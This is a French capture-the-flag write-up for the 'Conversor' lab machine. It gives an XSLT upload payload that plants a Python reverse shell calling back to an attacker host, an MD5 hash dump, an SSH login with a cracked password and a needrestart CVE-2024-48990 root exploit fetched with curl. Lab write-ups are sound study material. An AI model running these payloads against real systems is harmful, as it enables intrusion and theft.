# Conversor

	echo "10.10.11.92 conversor.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.92 -e tun0 > ports.txt
	sudo nmap -p- -T4 -A 10.10.11.92 -oN nmap.txt
	feroxbuster --silent -u http://conversor.htb
	
Scans classiques.

Code source récupérable : http://conversor.htb/static/source_code.tar.gz

    tar -xvf source_code.tar.gz

Possibilité d'envoyer des XML et des XSLT après s'être enregistré. 

Ils ne semblent pas vérifiés donc on peut écrire dans le dossier /var/www/conversor.htb/scripts/ qui est utilisé par une tâche planifiée (d'après le fichier .md) : 

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common" 
 extension-element-prefixes="exploit"
 version="1.0">
 <xsl:template match="/">
 <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")</exploit:document>
 </xsl:template>
</xsl:stylesheet>
```

Ce payload envoie un reverse-shell en Python et on obtient rapidement un retour en tant que www-data.

Le fichier "users.db" que l'on voyait dans le code source trouvé au début est bien là et on peut y trouver plusieurs utilisateurs : 

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test|098f6bcd4621d373cade4e832627b4f6
6|nobody|6e854442cd2a940c9e95941dce4ad598
7|v|9e3669d19b675bd57058fd4664205d2a
```

Le mot de passe de fismathack est faible et cassable.

	ssh fismathack@10.10.11.92
	cat user.txt	 

## Élévation de privilèges

	sudo -l
    
>    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart


Un "-v" sur le binaire nous indique que l'on est sur la version 3.7 et il existe une élévation de privilèges pour cette version :

- https://github.com/ally-petitt/CVE-2024-48990-Exploit/tree/main

Exploitation : 

    curl http://10.10.15.26/poc.zip
    unzip poc.zip
    export PYTHONPATH=/home/fismathack/CVE-2024-48990-Exploit-main/
    
    cd CVE-2024-48990-Exploit-main/
    python3 main.py
    
    nc -nvlp 1337
    sudo /usr/sbin/needrestart
    
	whoami
	cat /root/root.txt
